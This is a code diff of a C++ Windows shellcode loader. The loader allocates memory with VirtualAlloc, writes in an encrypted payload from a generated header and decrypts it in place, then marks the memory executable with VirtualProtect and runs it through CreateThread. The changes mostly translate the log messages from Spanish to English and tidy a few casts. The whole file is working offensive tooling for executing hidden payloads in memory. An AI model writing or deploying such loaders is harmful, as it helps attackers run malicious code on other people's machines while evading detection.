@@ -2,6 +2,8 @@
 #include <print>
 #include <array>
 #include <span>
+#include <memory>
+#include <string_view>
 #include "generated/payload.hpp"
 
 import lbyte.stx;
@@ -43,16 +45,14 @@ auto main() -> i32
     };
 
     if ( not exec_mem ) {
-        println(stderr, "[-] Error en VirtualAlloc: {}", GetLastError());
+        println(stderr, "[-] VirtualAlloc failed: {}", GetLastError());
         return EXIT_FAILURE;
     }
-
-    println("[+] exec_mem: 0x{:X}", rcast<uptr>(exec_mem.get()));
 
     mem::write(exec_mem.get(), shellcode);
     crypt(span{exec_mem.get(), shellcode.size()}, key);
 
-    println("[+] Opcodes copiados");
+    println("[+] Payload copied successfully on: 0x{:X}", rcast<uptr>(exec_mem.get()));
 
     auto old_protect = ulong{};
     auto success     = VirtualProtect(
@@ -63,33 +63,33 @@ auto main() -> i32
     );
 
     if ( not success ) {
-        println(stderr, "[-] Error en VirtualProtect: {}", ::GetLastError());
+        println(stderr, "[-] VirtualProtect failed: {}", GetLastError());
         return EXIT_FAILURE;
     }
 
-    println("[+] Creando hilo...");
+    println("[+] Creating thread...");
 
     auto thread_id = u32{};
     auto h_thread  = std::unique_ptr<u8, decltype(handle_close)>{
         rcast<u8*>(CreateThread(
             null,
-            0,
+            0x00,
             rcast<LPTHREAD_START_ROUTINE>( exec_mem.get()),
             null,
-            0,
-            rcast<unsigned long*>( &thread_id )
+            0x00,
+            rcast<LPDWORD>( &thread_id )
         )),
         handle_close
     };
 
     if ( not h_thread ) {
-        println(stderr, "[-] Error en CreateThread: {}", ::GetLastError());
+        println(stderr, "[-] CreateThread failed: {}", GetLastError());
         return EXIT_FAILURE;
     }
 
-    println("[+] Hilo [{}] inicializado. Esperando retorno...", thread_id);
+    println("[+] Thread {} initialized. Waiting for execution...", thread_id);
     WaitForSingleObject( h_thread.get(), INFINITE );
 
-    println("[+] Flujo finalizado.");
+    println("[+] Execution finished.");
 }
 
